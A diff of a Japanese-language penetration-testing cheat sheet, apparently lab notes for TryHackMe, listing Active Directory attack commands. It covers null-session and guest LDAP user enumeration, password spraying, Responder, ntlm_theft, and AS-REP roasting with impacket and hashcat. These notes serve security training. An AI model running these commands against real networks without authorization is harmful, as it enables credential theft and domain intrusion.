@@ -33,6 +33,12 @@ nmap -sV <IP>
 
 ## ユーザー列挙
 ### enum4linux
+普通に使う
+```sh
+enum4linux -A  $Target_IP
+```
+
+
 SMB、RPC、LDAP経由でWindows/Sambaホストから情報を列挙し、ユーザーリストを取得
 ```shell
 enum4linux -U <DC_IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
@@ -46,7 +52,7 @@ enum4linux -u <ユーザー名> -p <パスワード> $Target_IP
 ### rpcclient
 RPCサービスに接続し、ドメインユーザーなどの情報を列挙（Nullセッションでも可）
 ```shell
-rpcclient -U "" -N <DC_IP>
+rpcclient -U "" -N $Target_IP
 ```
 
 ```shell
@@ -57,6 +63,17 @@ SMBプロトコルを使用してネットワーク上のホストに対して�
 ```shell
 crackmapexec smb <DC_IP> --users
 ```
+
+### nxc
+CrackMapExecの後継で、アクティブに開発が進められてる
+
+guestで LDAP に接続してユーザー列挙
+- 特定のユーザーの description フィールドにパスワードが埋め込まれていることがあり、このツールで、それを見つけられる
+	- 使用例 : [[TryHackMe_Memo/Machine/Ledger#nxc\|Ledger#nxc]]
+```sh
+nxc ldap <Domain> -u 'guest' -p '' --users
+```
+
 ### ldapsearch
 LDAPサーバーに接続し、指定した条件でユーザー情報などを検索・列挙（匿名バインドも可能）
 ```shell
@@ -90,6 +107,7 @@ Windowsコマンドで、ローカルまたはドメインのパスワードポ�
 ```shell
 net accounts
 ```
+
 ### PowerView
 
 PowerViewはこいつしか信用するな
@@ -133,6 +151,7 @@ Invoke-DomainPasswordSpray -Password '<PASSWORD_TO_SPRAY>' -OutFile spray_succes
 sudo responder -I <NIC>
 ```
 ### ntlm_theft
+SMBに書き込みができる時に使用例あり
 - https://github.com/Greenwolf/ntlm_theft
 ```sh
 git clone https://github.com/Greenwolf/ntlm_theft
@@ -169,7 +188,7 @@ Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname
 Impacketツールキットの一部で、事前認証不要のユーザーのAS-REPハッシュの取得
 ```shell
 (GetNPUsers.py)
-GetNPUsers.py <DOMAIN_NAME>/ -dc-ip <DC_IP> -no-pass -usersfile valid_ad_users -format hashcat -outputfile asrep_hashes.txt
+impacket-GetNPUsers <DOMAIN_NAME>/ -dc-ip <DC_IP> -no-pass -usersfile valid_ad_users -format hashcat -outputfile asrep_hashes.txt
 ```
 ### hashcat
 AS-REPハッシュ（モード18200）を辞書攻撃やブルートフォース攻撃でクラック
